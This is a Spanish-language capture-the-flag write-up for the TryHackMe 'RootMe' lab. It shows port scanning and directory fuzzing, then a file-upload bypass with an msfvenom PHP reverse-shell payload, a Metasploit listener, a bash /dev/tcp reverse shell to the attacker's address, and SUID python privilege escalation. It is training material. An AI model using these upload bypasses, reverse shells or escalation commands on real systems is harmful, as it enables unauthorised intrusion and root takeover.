---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Linux
  - FileUpload
  - SUID
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#File Upload|File Upload]]
	- [[#Explotación#MSFvenom|MSFvenom]]
	- [[#Explotación#SUID|SUID]]

---
# Resolviendo la máquina RootMe

>En esta publicación, comparto cómo resolví la máquina [RootMe](https://tryhackme.com/room/rrootme) de [TryHackMe](https://tryhackme.com/).

---
## Enumeración
### Ping

Se ejecuta un *ping* para verificar la conectividad con la máquina y obtener pistas sobre su sistema operativo.

`ping -c 1 10.10.32.143`

![[Pasted image 20250711191823.png]]

*TTL=63* -> **Linux**
### Nmap

Se realiza un escaneo de puertos.

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.32.143 -oG allPorts`

![[Pasted image 20250711192131.png]]

`nmap -p22,80 -sCV 10.10.32.143 -oN targeted`

![[Pasted image 20250711192146.png]]
### Fuzzing Web

Se realiza **Fuzzing Web** para buscar directorios.

`gobuster dir -u http://10.10.32.143/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

![[Pasted image 20250711193116.png]]

`http://10.10.32.143/panel/`

![[Pasted image 20250711193149.png]]

`http://10.10.32.143/uploads/`

![[Pasted image 20250711193221.png]]

---
## Explotación
### File Upload

Se genera un payload con *MSFvenom* con extensión `.php` para intentar una ejecución remota en el servidor.

`msfvenom -p php/reverse_php LHOST=10.9.1.116 LPORT=444 -f raw > pwned.php`

![[Pasted image 20250711193515.png]]

Se vuelve a generar un *payload malicioso* con extensión `.phtml`.

`msfvenom -p php/reverse_php LHOST=10.9.1.116 LPORT=444 -f raw > pwned.phtml`

![[Pasted image 20250711193656.png]]

`http://10.10.32.143/uploads/`

![[Pasted image 20250711193733.png]]
### MSFvenom

Uso de *Metasploit* para recibir la conexión inversa del *payload* previamente cargado.

`multi/handler`

```
search multi/handler
use 0 | use multi/handler
show options
set LHOST 10.9.1.116
set LPORT 444
set PAYLOAD php/reverse_php
exploit
```

![[Pasted image 20250711194105.png]]

![[Pasted image 20250711195102.png]]

Una vez establecida la conexión, se ejecuta una *reverse shell* para asegurar persistencia en el acceso.

`bash -c "sh -i >& /dev/tcp/10.9.1.116/445 0>&1"`

Se realiza el tratamiento de la terminal.

```
script /dev/null -c bash 
Ctrl + Z 
stty raw -echo; fg
reset xterm 
export TERM=xterm 
export SHELL=bash
```

![[Pasted image 20250711195733.png]]
### SUID

Se realiza una búsqueda de binarios **SUID** para la escalada de privilegios. 

`find / -perm -4000 2>/dev/null`

![[Pasted image 20250711195247.png]]

Se observa un permiso sospechoso: *usr/bin/python*. Se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/).

![[Pasted image 20250711195503.png]]

`/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

![[Pasted image 20250711195606.png]]

---